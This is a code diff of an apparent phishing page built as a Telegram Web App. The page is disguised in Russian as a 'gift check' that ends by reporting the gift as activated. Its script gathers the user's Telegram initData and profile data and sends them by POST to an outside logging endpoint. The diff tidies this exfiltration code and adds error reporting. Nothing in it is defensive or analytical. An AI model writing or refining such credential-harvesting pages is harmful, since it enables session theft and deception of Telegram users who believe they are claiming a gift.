@@ -9,29 +9,35 @@
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>Проверка ваших подарков...</h2>
-    <p>Пожалуйста, подождите, мы сверяем данные аккаунта.</p>
+    <div id="status">
+        <div class="loader"></div>
+        <h2>Проверка подарка (v3)...</h2>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем на всё окно
+        tg.expand();
 
-        // Сбор данных
         const data = {
             initData: tg.initData, 
             user: tg.initDataUnsafe
         };
 
-    // Исправленная строка (добавлен /log)
-fetch('https://gift-backend-pq6k.onrender.com/log', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(data)
-})
-.then(response => {
-    if (response.ok) {
-        // Если данные ушли, можно остановить загрузку на экране
-        document.body.innerHTML = "<h1>Проверка завершена! Ваш подарок активирован.</h1>";
-    }
-});
+        fetch('https://gift-backend-pq6k.onrender.com/log', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('status').innerHTML = "<h1>Готово! Подарок активирован.</h1>";
+            } else {
+                document.getElementById('status').innerHTML = "<h1>Ошибка сервера: " + response.status + "</h1>";
+            }
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = "<h1>Ошибка сети: " + error + "</h1>";
+        });
+    </script>
+</body>
+</html>
